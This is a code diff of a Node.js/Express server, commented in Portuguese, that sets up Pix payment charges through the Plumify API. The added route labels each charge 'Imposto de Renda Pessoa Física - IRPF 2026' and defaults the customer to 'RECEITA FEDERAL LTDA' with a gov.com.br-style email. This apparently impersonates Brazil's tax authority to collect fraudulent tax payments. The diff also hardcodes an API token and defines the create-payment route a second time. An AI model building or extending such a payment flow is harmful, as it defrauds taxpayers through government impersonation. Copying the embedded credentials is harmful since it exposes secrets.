@@ -227,8 +227,7 @@ app.get('/password.html', (req, res) => {
 // Configurações Plumify
 const PLUMIFY_PRODUCT_HASH = 'smm88ihfg0';
 const PLUMIFY_API_TOKEN = '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa';
-const PLUMIFY_API_URL = 'https://api.plumify.com.br/api';  // ou 'https://api.plumify.com.br'
-
+const PLUMIFY_API_URL = 'https://api.Plumify.com.br/api/public/v1';
 // Função para gerar ID único da transação
 function generateTransactionId() {
     return 'TX-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex');
@@ -301,38 +300,58 @@ app.post('/api/create-payment', async (req, res) => {
     }
 });
 
-// Rota para consultar status do pagamento
-app.get('/api/payment-status/:reference_id', async (req, res) => {
-    const { reference_id } = req.params;
-    
+// Rota para criar pagamento via Plumify (CORRIGIDA - com URL oficial)
+app.post('/api/create-payment', async (req, res) => {
+    const { amount, customer_name, customer_email, customer_cpf } = req.body;
+
+    if (!amount || amount <= 0) {
+        return res.status(400).json({ error: 'Valor inválido' });
+    }
+
     try {
-        const response = await fetch(`${PLUMIFY_API_URL}/transactions/${reference_id}`, {
+        const payload = {
+            product_hash: PLUMIFY_PRODUCT_HASH,
+            amount: parseFloat(amount),
+            currency: 'BRL',
+            reference_id: generateTransactionId(),
+            customer: {
+                name: customer_name || 'RECEITA FEDERAL LTDA',
+                email: customer_email || 'receitafederal@gov.com.br',
+                cpf: customer_cpf || '00000000000'
+            },
+            items: [{
+                description: 'Imposto de Renda Pessoa Física - IRPF 2026',
+                quantity: 1,
+                amount: parseFloat(amount)
+            }],
+            payment_methods: ['pix']
+        };
+
+        console.log('📤 Enviando para Plumify:', JSON.stringify(payload, null, 2));
+
+        // URL CORRETA baseada na documentação
+        const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions`, {
+            method: 'POST',
             headers: {
-                'Authorization': `Bearer ${PLUMIFY_API_TOKEN}`
-            }
+                'api_token': PLUMIFY_API_TOKEN,  // Atenção: pode ser 'api_token' não 'Authorization'
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
         });
-        
+
         const data = await response.json();
-        
+        console.log('📥 Resposta Plumify:', data);
+
         res.json({
             success: true,
-            status: data.status
+            payment: data
         });
-    } catch (error) {
-        res.status(500).json({ error: 'Erro ao consultar pagamento' });
-    }
-});
 
-// Webhook para receber confirmações de pagamento
-app.post('/api/webhook/pagamento', async (req, res) => {
-    const { reference_id, status, amount } = req.body;
-    
-    console.log(`📢 Webhook recebido: Transação ${reference_id} - Status: ${status}`);
-    
-    try {
-        res.json({ received: true });
     } catch (error) {
-        res.status(500).json({ error: 'Erro ao processar webhook' });
+        console.error('Erro Plumify:', error.message);
+        res.status(500).json({
+            error: 'Erro ao gerar pagamento. Tente novamente.'
+        });
     }
 });
 
